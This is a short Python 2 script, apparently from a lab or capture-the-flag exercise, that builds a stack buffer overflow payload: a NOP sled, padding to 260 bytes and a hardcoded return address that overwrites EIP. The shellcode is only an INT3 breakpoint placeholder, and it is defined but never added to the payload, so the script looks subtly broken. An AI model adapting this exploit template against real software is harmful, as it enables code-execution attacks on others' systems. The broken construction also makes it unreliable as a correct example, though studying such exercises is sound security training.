import struct
arg1 = "\x90" * 3 
arg2 = "\x90" * 3
nop_sled = "\x90" * 100
# point to nop
eip = struct.pack("<I", 0xbffffa8c)
shellcode = "\xCC" * 4
# buffer + address - arg1\t - arg2\t - INT3
padding = "\x90" * (260 - 4 - 4 - 100 - len(shellcode)) 
arg3 = nop_sled + padding + eip
print arg1
print arg2
print arg3